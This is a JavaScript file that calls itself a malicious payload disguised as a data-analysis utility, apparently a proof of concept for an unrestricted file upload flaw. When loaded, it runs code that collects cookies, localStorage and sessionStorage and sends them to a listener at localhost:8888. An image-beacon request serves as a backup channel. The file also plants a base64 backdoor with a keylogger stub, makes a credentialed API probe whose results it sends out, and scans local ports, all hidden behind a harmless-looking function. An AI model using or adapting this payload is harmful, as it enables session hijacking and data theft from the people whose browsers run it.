// Malicious payload disguised as a utility script
// This will be auto-executed during "security scanning"

console.log("📊 Loading data analysis utilities...");

// Immediately executed malicious code
(function() {
    console.log("🚨 CRITICAL VULNERABILITY EXPLOITED! 🚨");
    console.log("Auto-execution triggered during 'security scan'");
    
    // Data exfiltration
    const sensitiveData = {
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        currentUrl: window.location.href,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    };
    
    console.log("🔓 Sensitive data collected:", sensitiveData);
    
    // Simulate data transmission
    console.log("📡 Transmitting data to attacker server...");
    
    // Send data to local listener
    fetch('http://localhost:8888/collect', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            type: 'exfiltrated_data',
            source: 'file_upload_vulnerability',
            sensitiveData: sensitiveData,
            attackVector: 'auto_execution_during_security_scan'
        })
    }).then(response => {
        console.log('✅ Data successfully transmitted to attacker server');
        return response.json();
    }).then(data => {
        console.log('📨 Server response:', data);
    }).catch(error => {
        console.log('❌ Primary transmission failed, trying backup method...');
        
        // Backup method: URL parameters
        const dataString = btoa(JSON.stringify(sensitiveData));
        const img = new Image();
        img.src = `http://localhost:8888/steal?data=${encodeURIComponent(dataString)}&type=backup_transmission`;
        
        setTimeout(() => {
            console.log('📡 Backup transmission attempted');
        }, 1000);
    });
    
    // Create persistent backdoor
    localStorage.setItem('backdoor_payload', btoa(`
        setInterval(() => {
            console.log('🕷️ Backdoor active at: ' + new Date().toISOString());
            // Keylogger simulation
            document.addEventListener('keydown', (e) => {
                console.log('Key pressed: ' + e.key);
            });
        }, 5000);
    `));
    
    // DOM manipulation attack
    // if (document.body) {
    //     const maliciousDiv = document.createElement('div');
    //     maliciousDiv.innerHTML = `
    //         <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,0,0,0.1);pointer-events:none;z-index:9999;">
    //             <div style="position:absolute;top:10px;right:10px;background:red;color:white;padding:5px;border-radius:3px;font-size:12px;">
    //                 🚨 SYSTEM COMPROMISED
    //             </div>
    //         </div>
    //     `;
    //     document.body.appendChild(maliciousDiv);
        
    //     // Remove after 5 seconds to be stealthy
    //     setTimeout(() => {
    //         if (maliciousDiv.parentNode) {
    //             maliciousDiv.parentNode.removeChild(maliciousDiv);
    //         }
    //     }, 5000);
    // }
    
    // Network reconnaissance
    console.log("🔍 Performing network reconnaissance...");
    fetch(window.location.origin + '/api/test', {
        method: 'GET',
        credentials: 'include'
    }).then(response => {
        console.log("API endpoint discovered: " + response.url);
        
        // Send reconnaissance data to attacker
        fetch('http://localhost:8888/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'network_reconnaissance',
                discoveredEndpoint: response.url,
                status: response.status,
                headers: Object.fromEntries(response.headers.entries())
            })
        }).catch(() => console.log('Recon data transmission failed'));
        
    }).catch(() => {
        console.log("API reconnaissance completed");
    });
    
    // Try to access other applications
    const commonPorts = [3000, 8000, 8080, 8888, 9000];
    commonPorts.forEach(port => {
        const img = new Image();
        img.onerror = () => console.log(`Port ${port}: Not accessible`);
        img.onload = () => console.log(`Port ${port}: Potentially accessible`);
        img.src = `http://localhost:${port}/favicon.ico`;
    });
    
    console.log("💀 Payload execution completed");
    console.log("📋 Attack vector: Unrestricted file upload with auto-execution");
    console.log("🎯 Impact: Remote Code Execution, Data Exfiltration, Persistent Access");
    
})();

// Legitimate-looking function to disguise the payload
function analyzeDataPatterns() {
    return "Analysis complete";
}